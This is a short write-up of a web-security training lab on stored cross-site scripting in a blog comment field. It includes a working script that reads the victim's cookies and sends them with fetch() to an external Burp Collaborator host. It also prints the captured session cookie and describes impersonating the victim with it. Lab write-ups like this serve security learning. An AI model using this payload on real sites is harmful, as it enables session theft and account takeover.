# [XSS] Lab: Exploiting cross-site scripting to steal cookies (1)

![Untitled](%5BXSS%5D%20Lab%20Exploiting%20cross-site%20scripting%20to%20steal%2088e7768f477247fdb10b1bc5e2bdee06/Untitled.png)

all other fields are filtered but in the comment filed we can inject <script> tags: 

![Untitled](%5BXSS%5D%20Lab%20Exploiting%20cross-site%20scripting%20to%20steal%2088e7768f477247fdb10b1bc5e2bdee06/Untitled%201.png)

![Untitled](%5BXSS%5D%20Lab%20Exploiting%20cross-site%20scripting%20to%20steal%2088e7768f477247fdb10b1bc5e2bdee06/Untitled%202.png)

![Untitled](%5BXSS%5D%20Lab%20Exploiting%20cross-site%20scripting%20to%20steal%2088e7768f477247fdb10b1bc5e2bdee06/Untitled%203.png)

since we were able to inject <script> tag we can just simple use 

```jsx
<script>
alert(document.cookie);
</script>
```

but since we need to exfiltrate the cookie we can use a variable and burp collaborator. 

![Untitled](%5BXSS%5D%20Lab%20Exploiting%20cross-site%20scripting%20to%20steal%2088e7768f477247fdb10b1bc5e2bdee06/Untitled%204.png)

```jsx
<script>
	var ckie = document.cookie 
  let colab = `tif8tzv0frnz6llnlkaxlj37hynpbfz4.oastify.com/?${encodeURIComponent(ckie)}`;
  // Sending the GET request
  fetch(colab)
</script>
```

![Untitled](%5BXSS%5D%20Lab%20Exploiting%20cross-site%20scripting%20to%20steal%2088e7768f477247fdb10b1bc5e2bdee06/Untitled%205.png)

now that we can see what the request was. 

if we decode the request from URL encoding

```jsx
/?secret=urml14vXd4SlfFb8LXi7k8Vy6YUtJVpV; session=gDc7Q2pfaagxWQr0qoGsajDsR9xSBRO2
```

so now to impersonate that user we simple just need to change our own cookie to there's 

I will use the browser for this but we can also use burp suite repeater for it.

using cookie manager extension: 

![Untitled](%5BXSS%5D%20Lab%20Exploiting%20cross-site%20scripting%20to%20steal%2088e7768f477247fdb10b1bc5e2bdee06/Untitled%206.png)

and then lets just refresh our page:  

![Untitled](%5BXSS%5D%20Lab%20Exploiting%20cross-site%20scripting%20to%20steal%2088e7768f477247fdb10b1bc5e2bdee06/Untitled%207.png)